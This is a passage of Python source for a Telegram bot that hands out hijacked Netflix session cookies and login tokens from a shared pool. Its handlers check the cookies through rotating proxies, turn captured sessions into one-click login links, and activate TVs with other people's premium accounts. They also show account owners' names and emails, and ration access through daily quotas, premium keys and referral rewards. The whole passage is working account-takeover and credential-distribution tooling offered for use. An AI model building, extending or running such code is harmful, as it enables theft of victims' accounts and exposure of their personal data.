    check_left = max(0, FREE_CHECK_LIMIT - user["checks_today"]) if not is_prem and not is_admin else "∞"
    mass_cookies_left = max(0, MASS_CHECK_DAILY_COOKIE_LIMIT - user["mass_checked_cookies_today"]) if not is_prem and not is_admin else "∞"
    check_quota_left = user.get("premium_check_quota", 0) if is_prem else 0
    get_quota_left = user.get("premium_get_quota", 0) if is_prem else 0
    pending = user.get("pending_premium", 0)

    status_lines = [
        "┌─ 📊 Your Status",
        f"├ Basic left: {basic_left}",
        f"├ Standard left: {standard_left}",
        f"├ Premium left: {premium_left}",
        f"├ Checks left: {check_left}",
        f"├ Mass check cookies left: {mass_cookies_left}",
        f"├ Premium: {'✅ Yes' if is_prem else '❌ No'}",
        f"├ Pending referrals: {pending}",
    ]
    if is_prem:
        status_lines.append(f"├ Check quota: {check_quota_left}")
        status_lines.append(f"├ Get quota: {get_quota_left}")
        expiry = datetime.fromtimestamp(user["premium_expiry"]).strftime("%Y-%m-%d %H:%M UTC")
        status_lines.append(f"├ Expires: {expiry}")
    status_lines.append(f"├ Referrals: {user['referral_count']}")
    if is_admin:
        status_lines.append("├ 🔑 Admin")
    status_lines.append("└─────────────────")

    multi_buttons = [
        [InlineKeyboardButton("🧊 Check", callback_data="mode_check"),
         InlineKeyboardButton("🧹 Purify", callback_data="mode_clean")],
        [InlineKeyboardButton("✂️ Split", callback_data="mode_split"),
         InlineKeyboardButton("📺 TV", callback_data="mode_tvlogin")],
    ]
    dist_buttons = [
        [InlineKeyboardButton("🍪 Claim", callback_data="dist_get"),
         InlineKeyboardButton("⭐ Premium", callback_data="dist_premium")],
        [InlineKeyboardButton("🔑 Redeem", callback_data="dist_redeem"),
         InlineKeyboardButton("🔗 Refer", callback_data="dist_referral")],
        [InlineKeyboardButton("✅ Verify", callback_data="dist_check"),
         InlineKeyboardButton("⚙️ Admin", callback_data="dist_admin") if is_admin else None],
        [InlineKeyboardButton("❓ Help", callback_data="dist_help")],
        [InlineKeyboardButton("🎁 Claim Referral", callback_data="dist_claim")],
    ]
    dist_buttons = [row for row in dist_buttons if any(b is not None for b in row)]
    for row in dist_buttons:
        row[:] = [b for b in row if b is not None]

    keyboard = multi_buttons + dist_buttons
    reply_markup = InlineKeyboardMarkup(keyboard)

    caption = (
        "🌟 NF BOT 🌟\n"
        "━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n" +
        "\n".join(status_lines) +
        "\n\n😉 Select a service below"
    )

    log.info(f"Image path: {os.path.abspath(START_IMAGE_PATH)}, exists: {os.path.exists(START_IMAGE_PATH)}")
    video_path = START_VIDEO_PATH
    if os.path.exists(video_path):
        try:
            with open(video_path, 'rb') as f:
                await context.bot.send_video(
                    chat_id=update.effective_chat.id,
                    video=InputFile(f, filename="welcome.mp4"),
                    caption=premium_emoji(caption),
                    reply_markup=reply_markup,
                    parse_mode='HTML',
                    supports_streaming=True
                )
            return
        except Exception as e:
            log.error(f"Failed to send video: {e}")

    image_path = os.getenv("START_IMAGE_PATH", "welcome.jpg")
    if os.path.exists(image_path):
        try:
            with open(image_path, 'rb') as f:
                await context.bot.send_photo(
                    chat_id=update.effective_chat.id,
                    photo=InputFile(f, filename="welcome.jpg"),
                    caption=premium_emoji(caption),
                    reply_markup=reply_markup,
                    parse_mode='HTML'
                )
            return
        except Exception as e:
            log.error(f"Failed to send image: {e}")

    await update.effective_message.reply_text(premium_emoji(caption), reply_markup=reply_markup, parse_mode='HTML')

async def help_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not update.effective_user:
        return
    user_id = str(update.effective_user.id)
    users, user = ensure_user(user_id)
    is_admin = user.get("is_admin", False)
    is_prem = is_premium(user)

    base_commands = [
        "📌 Core Commands",
        "/start – Show main menu & your status",
        "/get [plan] – Claim a working cookie (auto‑select if no plan)",
        "/nfcheck <NetflixId> – Verify a single cookie",
        "/link <url> – Extract nftoken from Netflix login link and check it",
        "/tv <code> [plan] – Activate TV (always uses premium pool)",
        "/premium – Check your premium status",
        "/redeem <KEY> – Redeem a premium key",
        "/referral – Get your referral link",
        "/claim – Claim pending referral rewards (one per use)",
        "/help – Show this help",
    ]

    free_info = [
        "\n📊 Free Limits",
        f"• Basic claims: {FREE_BASIC_LIMIT}/day",
        f"• Standard claims: {FREE_STANDARD_LIMIT}/day",
        f"• Premium claims: {FREE_PREMIUM_LIMIT}/day",
        f"• /nfcheck: {FREE_CHECK_LIMIT}/day",
        f"• Mass check: max {MAX_COOKIES_PER_MASS_CHECK} cookies per file",
        f"• Mass check daily limit: {MASS_CHECK_DAILY_COOKIE_LIMIT} cookies total",
        "\n🔹 You can claim Basic, Standard, or Premium plans.",
        "🔹 Use /referral to earn Premium cookies.",
    ]

    premium_info = [
        "\n⭐ Premium Benefits",
        "• Unlimited /nfcheck (quota from key)",
        "• Unlimited /get (quota from key)",
        "• Can claim Premium plan",
        "• Unlimited mass check (no daily cookie limit)",
    ]

    admin_info = [
        "\n🔧 Admin Commands",
        "/admin – Open admin panel",
        "/keys <check_q> <get_q> <hours> <max> – Generate premium key",
        "/check – Test proxies and update proxy.txt (admin only)",
        "/addproxy – Add proxies (one per line) – admin only",
        "/addprotxt – Upload .txt file with proxies – admin only",
        "/upload – Upload a .txt/.zip file to verify and add to pool (admin only)",
        "/ban <user_id> <reason> – Ban a user",
        "/unban <user_id> – Unban a user",
        "/listusers – Get list of all users (admin only)",
        "/broadcast <message> – Broadcast to all users",
        "/bdfb <yes/no> [minutes] – Auto-broadcast to pending feedback users",
        "/listfb – List users with pending feedback",
        "/clearfb <user_id> – Clear pending feedback for a user",
        "/autoban <yes/no> [minutes] – Auto-ban users who don't send feedback",
        "/ufile",
        "Send a .txt file in private chat to add cookies to the pool (auto‑classified).",
        "Admins have unlimited /get and /nfcheck.",
    ]

    msg = "\n".join(base_commands)
    if not is_prem and not is_admin:
        msg += "\n" + "\n".join(free_info)
    if is_prem:
        msg += "\n" + "\n".join(premium_info)
    if is_admin:
        msg += "\n" + "\n".join(admin_info)
    msg += f"\n\n{WATERMARK}"
    await update.effective_message.reply_text(premium_emoji(msg), parse_mode='HTML')

async def link_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not update.effective_user:
        return
    if not await require_join(update, context):
        return
    if not await require_no_pending_feedback(update, context):
        return
    if not await require_not_banned(update, context):
        return
    if not context.args:
        await update.effective_message.reply_text(
            premium_emoji("Usage: /link <Netflix login URL>\nExample: /link https://netflix.com/?nftoken=Bgi8u+...\nI'll visit the URL, capture the session, and check the account."),
            parse_mode='HTML'
        )
        return
    url = ' '.join(context.args)
    status_msg = await context.bot.send_message(
        chat_id=update.effective_chat.id,
        text=premium_emoji("⏳ Visiting Netflix login URL..."),
        parse_mode='HTML'
    )
    try:
        from urllib.parse import urlparse
        parsed = urlparse(url)
        if parsed.hostname not in ("www.netflix.com", "netflix.com", "api.netflix.com"):
            await status_msg.edit_text(premium_emoji("❌ Only Netflix URLs are allowed."), parse_mode='HTML')
            return

        session = requests.Session()
        session.headers.update({'User-Agent': get_random_user_agent()})
        proxy_str = random.choice(list(proxy_manager.proxies)) if proxy_manager.proxies else None
        proxy_dict = parse_proxy_line(proxy_str) if proxy_str else None
        if proxy_dict:
            session.proxies.update(proxy_dict)

        resp = await asyncio.to_thread(session.get, url, timeout=REQUEST_TIMEOUT, verify=False, allow_redirects=True)
        cookies = {c.name: c.value for c in session.cookies}
        netflix_id = cookies.get('NetflixId')
        if not netflix_id:
            await status_msg.edit_text(premium_emoji("❌ No NetflixId cookie found after visiting the link. The link may be invalid or expired."), parse_mode='HTML')
            return

        valid, info = await asyncio.to_thread(generator.verify_cookie, netflix_id)
        if valid:
            name = info.get('accountOwnerName', 'Unknown')
            email = info.get('email', 'Unknown')
            plan = info.get('localizedPlanName', 'Unknown')
            country = info.get('countryOfSignup', 'Unknown')
            token = info.get('_token', 'N/A')
            if not token or token == 'N/A':
                if 'nftoken=' in url:
                    token = url.split('nftoken=')[1].split('&')[0]
                else:
                    token = "N/A"
            output = (
                f"✅ Working cookie!\n"
                f"👤 Name: {name}\n"
                f"📧 Email: {email}\n"
                f"💳 Plan: {plan}\n"
                f"🌍 Country: {country}\n"
                f"🍪 Cookie (NetflixId): <code>{netflix_id}</code>\n"
                f"🔑 Token: <code>{token}</code>\n"
                f"🔗 Login Link: https://netflix.com/?nftoken={token}"
            )
            await status_msg.edit_text(premium_emoji(output), parse_mode='HTML')
        else:
            await status_msg.edit_text(
                premium_emoji(f"❌ Invalid or expired cookie.\nReason: {info.get('reason', 'Could not retrieve account info.')}"),
                parse_mode='HTML'
            )
    except Exception as e:
        await status_msg.edit_text(premium_emoji(f"❌ Error visiting link: {str(e)}"), parse_mode='HTML')

async def tv_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not update.effective_user:
        return
    if not await require_join(update, context):
        return
    if not await require_no_pending_feedback(update, context):
        return
    if not await require_not_banned(update, context):
        return

    args = context.args
    if not args:
        await update.effective_message.reply_text(
            premium_emoji("Usage: /tv <8-digit code>\nTV login always uses Premium cookies."),
            parse_mode='HTML'
        )
        return
    tv_code = re.sub(r'\D', '', args[0])
    if len(tv_code) != 8:
        await update.effective_message.reply_text(premium_emoji("❌ TV code must be exactly 8 digits!"), parse_mode='HTML')
        return

    user_id = str(update.effective_user.id)
    users, user = ensure_user(user_id, update.effective_user.username)
    is_admin = user.get("is_admin", False)

    basic, standard, premium = await get_pool_cached()
    if not premium:
        await update.effective_message.reply_text(premium_emoji("❌ No premium cookies in the pool. Admin needs to add some."), parse_mode='HTML')
        return

    status_msg = await context.bot.send_message(
        chat_id=update.effective_chat.id,
        text=premium_emoji(f"🔍 Starting TV login\n📺 Code: {tv_code}\n📦 Plan: Premium\n⏳ Searching for working cookie..."),
        parse_mode='HTML'
    )

    task = asyncio.create_task(
        run_tv_login_task(update.effective_chat.id, user_id, tv_code, status_msg, context, is_admin, update.effective_user.username)
    )
    user_tasks[user_id] = task

async def run_tv_login_task(chat_id: int, user_id: str, tv_code: str, status_msg, context, is_admin: bool, username: str = None):
    loop = asyncio.get_running_loop()
    try:
        async def progress_callback(current, total, nid):
            try:
                await status_msg.edit_text(
                    premium_emoji(f"🔍 Starting TV login\n📺 Code: {tv_code}\n📦 Plan: Premium\n⏳ Trying cookie {current}/{total}..."),
                    parse_mode='HTML'
                )
            except Exception:
                pass

        def thread_worker():
            return process_tv_login_from_pool(tv_code, progress_callback, loop)

        result = await asyncio.to_thread(thread_worker)

        with tv_stats_lock:
            tv_stats["total_logins"] += 1
            if result["success"]:
                tv_stats["successful"] += 1
                if not is_admin:
                    set_pending_feedback(user_id, "tv", result.get('nid', 'Unknown'), "Premium", clean_text(result.get('email', '')), username)
                    resp = premium_emoji(
                        f"✅ TV ACTIVATED SUCCESSFULLY!\n\n"
                        f"📺 Code: {tv_code}\n🌍 Country: {format_country_with_flag(result.get('country', 'N/A'))}\n"
                        f"📦 Plan: Premium\n\n"
                        f"📸 **Please send a screenshot** of the TV screen showing the activation worked.\n"
                        f"You have **{FEEDBACK_TIMEOUT_MINUTES} minutes** to send it.\n"
                        f"Until then, you can only use `/nfcheck`."
                    )
                else:
                    resp = premium_emoji(f"✅ TV ACTIVATED SUCCESSFULLY!\n\n📺 Code: {tv_code}\n🌍 Country: {format_country_with_flag(result.get('country', 'N/A'))}\n📦 Plan: Premium\n\nYour TV is now ready! 🍿")
                await status_msg.edit_text(resp, parse_mode='HTML')
            elif result.get("error") == "all_cookies_failed":
                tv_stats["failed"] += 1
                tried = result.get('tried_countries', [])
                resp = premium_emoji(f"❌ All cookies failed!\n\nTried {len(tried)} cookies\nCountries: {', '.join(set(tried)) if tried else 'N/A'}\n\nNo more premium cookies left.")
                await status_msg.edit_text(resp, parse_mode='HTML')
            elif "Invalid" in str(result.get("error", "")) or "expired" in str(result.get("error", "")).lower():
                tv_stats["codes_rejected"] += 1
                resp = premium_emoji(f"❌ Invalid or Expired TV Code\n\n📺 Code: {tv_code}\n🌍 Cookie country: {format_country_with_flag(result.get('country', 'N/A'))}\n\nPlease get a fresh code from your TV.")
                await status_msg.edit_text(resp, parse_mode='HTML')
            else:
                tv_stats["codes_rejected"] += 1
                resp = premium_emoji(f"❌ Activation Failed\n\n📺 Code: {tv_code}\n⚠️ {result.get('error', 'Unknown error')}")
                await status_msg.edit_text(resp, parse_mode='HTML')

    except asyncio.CancelledError:
        await status_msg.edit_text(premium_emoji("⏹️ TV login cancelled."), parse_mode='HTML')
    except Exception as e:
        log.exception("TV login task error")
        await status_msg.edit_text(premium_emoji(f"❌ Internal error: {str(e)[:100]}"), parse_mode='HTML')
    finally:
        if user_id in user_tasks:
            del user_tasks[user_id]
        await cleanup_user(user_id)

async def get(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not update.effective_user:
        return
    if not await require_join(update, context):
        return
    if not await require_no_pending_feedback(update, context):
        return
    if not await require_not_banned(update, context):
        return

    user_id = str(update.effective_user.id)
    users, user = ensure_user(user_id, update.effective_user.username)
    used = load_used()
    basic_pool, standard_pool, premium_pool = await get_pool_cached()
    is_admin = user.get("is_admin", False)
    is_prem = is_premium(user)
    today = datetime.now().strftime("%Y-%m-%d")
    if user["last_claim_date"] != today:
        user["last_claim_date"] = today
        user["claimed_basic_today"] = 0
        user["claimed_standard_today"] = 0
        user["claimed_premium_today"] = 0

    if is_admin:
        allowed_plans = {"basic": PREMIUM_LIMIT, "standard": PREMIUM_LIMIT, "premium": PREMIUM_LIMIT}
        pool_map = {
            "basic": ([c for c in basic_pool if c not in used], "Basic", "basic"),
            "standard": ([c for c in standard_pool if c not in used], "Standard", "standard"),
            "premium": ([c for c in premium_pool if c not in used], "Premium", "premium")
        }
    elif is_prem:
        allowed_plans = {"basic": FREE_BASIC_LIMIT, "standard": FREE_STANDARD_LIMIT, "premium": PREMIUM_LIMIT}
        pool_map = {
            "basic": ([c for c in basic_pool if c not in used], "Basic", "basic"),
            "standard": ([c for c in standard_pool if c not in used], "Standard", "standard"),
            "premium": ([c for c in premium_pool if c not in used], "Premium", "premium")
        }
    else:
        allowed_plans = {"basic": FREE_BASIC_LIMIT, "standard": FREE_STANDARD_LIMIT, "premium": FREE_PREMIUM_LIMIT}
        pool_map = {
            "basic": ([c for c in basic_pool if c not in used], "Basic", "basic"),
            "standard": ([c for c in standard_pool if c not in used], "Standard", "standard"),
            "premium": ([c for c in premium_pool if c not in used], "Premium", "premium")
        }

    args = context.args
    requested_plan = args[0].lower() if args and args[0].lower() in allowed_plans else None

    # Auto-select plan: for free users, try Premium first, then Standard, then Basic
    if not requested_plan:
        if is_admin or is_prem:
            requested_plan = "premium"
        else:
            # Check if premium pool has cookies and user hasn't claimed premium today
            if user["claimed_premium_today"] < FREE_PREMIUM_LIMIT and pool_map.get("premium") and pool_map["premium"][0]:
                requested_plan = "premium"
            elif user["claimed_standard_today"] < FREE_STANDARD_LIMIT and pool_map.get("standard") and pool_map["standard"][0]:
                requested_plan = "standard"
            elif user["claimed_basic_today"] < FREE_BASIC_LIMIT and pool_map.get("basic") and pool_map["basic"][0]:
                requested_plan = "basic"
            else:
                await update.effective_message.reply_text(
                    premium_emoji("❌ You have used all your free cookies today or no cookies available in any pool.\nUse /referral to earn Premium cookies."),
                    parse_mode='HTML'
                )
                return

    if requested_plan not in allowed_plans:
        await update.effective_message.reply_text(premium_emoji(f"❌ You are not allowed to use {requested_plan} plan."), parse_mode='HTML')
        return

    quota_field = f"claimed_{requested_plan}_today"
    if is_admin:
        pass
    elif is_prem:
        if requested_plan == "premium":
            if user.get("premium_get_quota", 0) <= 0:
                await update.effective_message.reply_text(premium_emoji("❌ Your premium get quota is exhausted. Redeem a new key."), parse_mode='HTML')
                return
        else:
            if user.get(quota_field, 0) >= allowed_plans[requested_plan]:
                await update.effective_message.reply_text(premium_emoji(f"❌ You have reached your daily limit for {requested_plan} plan."), parse_mode='HTML')
                return
    else:
        limit = allowed_plans[requested_plan]
        if user.get(quota_field, 0) >= limit:
            await update.effective_message.reply_text(premium_emoji(f"❌ You have reached your daily limit for {requested_plan} plan."), parse_mode='HTML')
            return

    pool, pool_name, plan_type = pool_map[requested_plan]
    if not pool:
        await update.effective_message.reply_text(premium_emoji(f"❌ No {pool_name} cookies available in the pool."), parse_mode='HTML')
        return

    random.shuffle(pool)
    working_id = None
    working_token = None
    working_info = {}
    total = len(pool)

    status_msg = await context.bot.send_message(
        chat_id=update.effective_chat.id,
        text=premium_emoji(f"⏳ Testing cookies... (0/{total})"),
        parse_mode='HTML'
    )

    loop = asyncio.get_running_loop()
    BATCH_TEST_SIZE = 4
    BATCH_TIMEOUT = 40

    for start in range(0, total, BATCH_TEST_SIZE):
        batch = pool[start:start + BATCH_TEST_SIZE]
        if working_id:
            break
        tasks = [loop.run_in_executor(GLOBAL_EXECUTOR, generator.verify_cookie, nid) for nid in batch]

        try:
            results = await asyncio.wait_for(
                asyncio.gather(*tasks, return_exceptions=True),
                timeout=BATCH_TIMEOUT
            )
        except asyncio.TimeoutError:
            for nid in batch:
                used.add(nid)
            save_used(used)
            await status_msg.edit_text(
                premium_emoji(f"⏳ Testing cookies... ({min(start + BATCH_TEST_SIZE, total)}/{total}) [timeout]"),
                parse_mode='HTML'
            )
            continue

        for nid, result in zip(batch, results):
            if isinstance(result, Exception):
                used.add(nid)
                save_used(used)
                continue
            valid, info = result
            if valid and info.get('hold') != 'Yes':
                fresh_valid, fresh_info = await loop.run_in_executor(GLOBAL_EXECUTOR, generator.verify_cookie, nid)
                if fresh_valid and fresh_info.get('hold') != 'Yes':
                    working_token = fresh_info.get('_token')
                    if not working_token:
                        cookies, _ = await loop.run_in_executor(GLOBAL_EXECUTOR, generator.get_cookies_and_info, nid)
                        if cookies:
                            token_data, _ = await loop.run_in_executor(GLOBAL_EXECUTOR, generate_nftoken, cookies)
                            if token_data:
                                working_token = token_data.get('token')
                    if working_token:
                        working_id = nid
                        working_info = fresh_info
                        break
                    else:
                        used.add(nid)
                        save_used(used)
                else:
                    used.add(nid)
                    save_used(used)
            else:
                if not valid or info.get('hold') == 'Yes':
                    used.add(nid)
                    save_used(used)

        try:
            await status_msg.edit_text(
                premium_emoji(f"⏳ Testing cookies... ({min(start + BATCH_TEST_SIZE, total)}/{total})"),
                parse_mode='HTML'
            )
        except:
            pass

    if not working_id:
        await status_msg.edit_text(
            premium_emoji(f"❌ No working {pool_name} cookies found after testing {total} cookies."),
            parse_mode='HTML'
        )
        return

    used.add(working_id)
    save_used(used)

    if is_admin:
        pass
    elif is_prem:
        if requested_plan == "premium":
            user["premium_get_quota"] -= 1
        else:
            user[quota_field] = user.get(quota_field, 0) + 1
    else:
        user[quota_field] = user.get(quota_field, 0) + 1
    user["claimed_total"] += 1
    save_users(users)

    output = format_output(working_token, working_info, working_id)
    used_today = user["claimed_basic_today"] + user["claimed_standard_today"] + user["claimed_premium_today"]
    remaining = user["premium_get_quota"] if is_prem else "N/A"

    if not is_admin:
        set_pending_feedback(user_id, "get", working_id, requested_plan, clean_text(working_info.get('email', '')), update.effective_user.username)
        final_msg = (
            f"🍪 Working {pool_name} cookie!\n"
            f"Used today: {used_today}/{FREE_BASIC_LIMIT + FREE_STANDARD_LIMIT + FREE_PREMIUM_LIMIT}\n"
            f"Premium get quota remaining: {remaining}\n\n"
            f"{output}\n\n"
            f"📸 **Please send a screenshot** of the Netflix home page (logged in) to confirm this cookie works.\n"
            f"You have **{FEEDBACK_TIMEOUT_MINUTES} minutes** to send it.\n"
            f"Until then, you can only use `/nfcheck`."
        )
    else:
        final_msg = (
            f"🍪 Working {pool_name} cookie!\n"
            f"Used today: {used_today}/{FREE_BASIC_LIMIT + FREE_STANDARD_LIMIT + FREE_PREMIUM_LIMIT}\n"
            f"Premium get quota remaining: {remaining}\n\n"
            f"{output}"
        )

    await status_msg.edit_text(premium_emoji(final_msg), parse_mode='HTML')

async def premium_status(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not update.effective_user:
        return
    if not await require_join(update, context):
        return
    if not await require_no_pending_feedback(update, context):
        return
    if not await require_not_banned(update, context):
        return
    user_id = str(update.effective_user.id)
    _, user = ensure_user(user_id, update.effective_user.username)
    if is_premium(user):
        expiry = datetime.fromtimestamp(user["premium_expiry"]).strftime("%Y-%m-%d %H:%M UTC")
        check_q = user.get("premium_check_quota", 0)
        get_q = user.get("premium_get_quota", 0)
        pending = user.get("pending_premium", 0)
        await update.effective_message.reply_text(
            premium_emoji(f"✅ Premium active until {expiry}\nCheck quota: {check_q}\nGet quota: {get_q}\nPending referrals: {pending}\nUse /claim to redeem pending referrals."),
            parse_mode='HTML'
        )
    else:
        pending = user.get("pending_premium", 0)
        await update.effective_message.reply_text(
            premium_emoji(f"❌ Not premium.\nPending referrals: {pending}\nUse /redeem <key> to upgrade or /claim to redeem pending referrals."),
            parse_mode='HTML'
        )

async def redeem(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not update.effective_user:
        return
    if not await require_join(update, context):
        return
    if not await require_no_pending_feedback(update, context):
        return
    if not await require_not_banned(update, context):
        return
    if not context.args:
        await update.effective_message.reply_text(premium_emoji("Usage: /redeem KEY"), parse_mode='HTML')
        return
    key = context.args[0].strip()
    keys = load_keys()
    if key not in keys:
        await update.effective_message.reply_text(premium_emoji("❌ Invalid key."), parse_mode='HTML')
        return
    key_data = keys[key]
    if key_data["remaining_uses"] <= 0:
        await update.effective_message.reply_text(premium_emoji("❌ This key has been fully used."), parse_mode='HTML')
        return
    user_id = str(update.effective_user.id)
    users, user = ensure_user(user_id, update.effective_user.username)
    check_quota = key_data["check_quota"]
    get_quota = key_data["get_quota"]
    duration = key_data["duration_hours"]
    current_expiry = user.get("premium_expiry", 0)
    new_expiry = max(current_expiry, time.time()) + duration * 3600
    user["premium_expiry"] = new_expiry
    user["premium_check_quota"] = user.get("premium_check_quota", 0) + check_quota
    user["premium_get_quota"] = user.get("premium_get_quota", 0) + get_quota
    key_data["remaining_uses"] -= 1
    save_keys(keys)
    save_users(users)
    await update.effective_message.reply_text(
        premium_emoji(f"✅ Premium activated!\nCheck quota: {check_quota}\nGet quota: {get_quota}\nDuration: {duration} hours\nExpires: {datetime.fromtimestamp(new_expiry).strftime('%Y-%m-%d %H:%M UTC')}"),
        parse_mode='HTML'
    )

async def referral(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not update.effective_user:
        return
    if not await require_join(update, context):
        return
    if not await require_no_pending_feedback(update, context):
        return
    if not await require_not_banned(update, context):
        return
    user_id = str(update.effective_user.id)
    username = context.bot.username or "darkhuchannel"
    link = f"https://t.me/{username}?start=ref_{user_id}"
    await update.effective_message.reply_text(
        premium_emoji(f"🔗 Your referral link:\n{link}\n\nShare this link. Each new user who joins gives you +1 Premium cookie.\nUse /claim to redeem your earned cookies.\nReward per referral: {REFERRAL_REWARD_HOURS}h + {REFERRAL_REWARD_CHECK_QUOTA} checks + {REFERRAL_REWARD_GET_QUOTA} gets."),
        parse_mode='HTML'
    )

async def claim_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not update.effective_user:
        return
    if not await require_join(update, context):
        return
    if not await require_no_pending_feedback(update, context):
        return
    if not await require_not_banned(update, context):
        return
    user_id = str(update.effective_user.id)
    users, user = ensure_user(user_id, update.effective_user.username)

    pending = user.get("pending_premium", 0)
    if pending <= 0:
        await update.effective_message.reply_text(
            premium_emoji("❌ You have no pending referral rewards to claim.\nRefer friends using /referral to earn them."),
            parse_mode='HTML'
        )
        return

    success = grant_referral_reward(user_id, users)
    if success:
        save_users(users)
        users, user = ensure_user(user_id, update.effective_user.username)
        new_pending = user.get("pending_premium", 0)
        expiry = datetime.fromtimestamp(user["premium_expiry"]).strftime("%Y-%m-%d %H:%M UTC")
        msg = (
            f"✅ You claimed one referral reward!\n\n"
            f"🎁 Reward granted:\n"
            f"• +{REFERRAL_REWARD_HOURS} hours premium (expires: {expiry})\n"
            f"• +{REFERRAL_REWARD_CHECK_QUOTA} /nfcheck uses\n"
            f"• +{REFERRAL_REWARD_GET_QUOTA} /get uses\n"
            f"📦 Remaining pending referrals: {new_pending}\n\n"
            f"Use /claim again to claim another, or /premium to check your status."
        )
        await update.effective_message.reply_text(premium_emoji(msg), parse_mode='HTML')
    else:
        await update.effective_message.reply_text(
            premium_emoji("❌ Failed to claim reward. Please try again later."),
            parse_mode='HTML'
        )

async def check_cookie(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not update.effective_user:
        return
    if not await require_join(update, context):
        return
    user_id = str(update.effective_user.id)
    users, user = ensure_user(user_id, update.effective_user.username)
    is_prem = is_premium(user)
    is_admin = user.get("is_admin", False)
    today = datetime.now().strftime("%Y-%m-%d")
    if user.get("last_check_date") != today:
        user["last_check_date"] = today
        user["checks_today"] = 0

    if is_admin:
        check_limit = PREMIUM_LIMIT
        limit_display = "∞"
    elif is_prem:
        if user.get("premium_check_quota", 0) <= 0:
            await update.effective_message.reply_text(premium_emoji("❌ Your premium check quota is exhausted. Please redeem a new key."), parse_mode='HTML')
            return
        check_limit = user["premium_check_quota"]
        limit_display = str(check_limit)
    else:
        check_limit = FREE_CHECK_LIMIT
        limit_display = str(FREE_CHECK_LIMIT)

    if user["checks_today"] >= check_limit and not is_admin:
        await update.effective_message.reply_text(
            premium_emoji(f"❌ You have reached your daily check limit ({check_limit} checks).\nUpgrade to Premium for unlimited checks."),
            parse_mode='HTML'
        )
        return

    if not context.args:
        await update.effective_message.reply_text(premium_emoji("Usage: /nfcheck NetflixId or raw token"), parse_mode='HTML')
        return

    raw = ' '.join(context.args)
    nid = extract_netflix_id(raw)
    if not nid:
        await update.effective_message.reply_text(premium_emoji("❌ Could not extract NetflixId."), parse_mode='HTML')
        return

    user["checks_today"] += 1
    if is_prem and not is_admin:
        user["premium_check_quota"] -= 1
    save_users(users)

    global_stats["total_single_checks"] += 1

    remaining = check_limit - user["checks_today"] if not is_admin else "∞"
    remaining_display = "∞" if is_admin else str(remaining)
    await update.effective_message.reply_text(premium_emoji(f"⏳ Checking cookie... (remaining checks today: {remaining_display})"), parse_mode='HTML')
    valid, info = await asyncio.to_thread(generator.verify_cookie, nid)
    if valid:
        token = info.get('_token')
        if not token:
            fresh = await get_cached_token(nid)
            if fresh:
                token = fresh
        output = format_output(token, info, nid)
        await update.effective_message.reply_text(premium_emoji(f"✅ Cookie is valid!\n{output}"), parse_mode='HTML')
    else:
        await update.effective_message.reply_text(premium_emoji(f"❌ Cookie is invalid or expired.\nNetflixId: {nid}"), parse_mode='HTML')

async def admin_panel(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not update.effective_user:
        return
    if not await require_join(update, context):
        return
    user_id = str(update.effective_user.id)
    _, user = ensure_user(user_id, update.effective_user.username)
    if not user.get("is_admin", False):
        await update.effective_message.reply_text(premium_emoji("⛔ Admin only."), parse_mode='HTML')
        return
    keyboard = [
        [InlineKeyboardButton("📊 Stats", callback_data="admin_stats")],
        [InlineKeyboardButton("🔑 Generate Key", callback_data="admin_genkey")],
        [InlineKeyboardButton("🔄 Reload Pool", callback_data="admin_reload")],
        [InlineKeyboardButton("📥 Add Cookie", callback_data="admin_addcookie")],
        [InlineKeyboardButton("📤 Upload File", callback_data="admin_upload")],
        [InlineKeyboardButton("👥 List Users", callback_data="admin_users")],
    ]
    await update.effective_message.reply_text(
        premium_emoji("🔧 Admin Panel"),
        reply_markup=InlineKeyboardMarkup(keyboard),
        parse_mode='HTML'
    )

async def admin_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    if not query.from_user:
        return
    user_id = str(query.from_user.id)
    _, user = ensure_user(user_id, update.effective_user.username)
    if not user.get("is_admin", False):
        await query.edit_message_text(premium_emoji("⛔ Admin only."), parse_mode='HTML')
        return
    data = query.data
    if data == "admin_stats":
        users = load_users()
        used = load_used()
        basic_raw, standard_raw, premium_raw = await get_pool_cached()
        avail_basic = len([c for c in basic_raw if c not in used])
        avail_standard = len([c for c in standard_raw if c not in used])
        avail_premium = len([c for c in premium_raw if c not in used])
        total_cookies = len(basic_raw) + len(standard_raw) + len(premium_raw)
        total_used = len(used)
        total_users = len(users)
        premium_users = sum(1 for u in users.values() if u.get("premium_expiry", 0) > time.time() and (u.get("premium_check_quota", 0) > 0 or u.get("premium_get_quota", 0) > 0))
        with tv_stats_lock:
            tv = tv_stats
        msg = (
            f"📊 Bot Stats\n"
            f"━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n"
            f"👥 Users:\n"
            f"  • Total: {total_users}\n"
            f"  • Premium: {premium_users}\n"
            f"━━━━━━━━━━━━━━━━━━━━━━━━\n"
            f"🍪 Cookie Pool:\n"
            f"  • Basic: {avail_basic} (total {len(basic_raw)})\n"
            f"  • Standard: {avail_standard} (total {len(standard_raw)})\n"
            f"  • Premium: {avail_premium} (total {len(premium_raw)})\n"
            f"  • Used: {total_used}\n"
            f"  • Total cookies: {total_cookies}\n"
            f"━━━━━━━━━━━━━━━━━━━━━━━━\n"
            f"📺 TV Logins:\n"
            f"  • Total attempts: {tv['total_logins']}\n"
            f"  • Successful: {tv['successful']}\n"
            f"  • Failed (dead): {tv['failed']}\n"
            f"  • Invalid codes: {tv['codes_rejected']}\n"
            f"  • Started: {tv['started_at']}\n"
            f"━━━━━━━━━━━━━━━━━━━━━━━━\n"
            f"🔍 Checks:\n"
            f"  • Mass checks run: {global_stats['total_mass_checks']}\n"
            f"  • Single checks: {global_stats['total_single_checks']}\n"
            f"  • Started: {global_stats['started_at']}\n"
        )
        await query.edit_message_text(premium_emoji(msg), parse_mode='HTML')
    elif data == "admin_genkey":
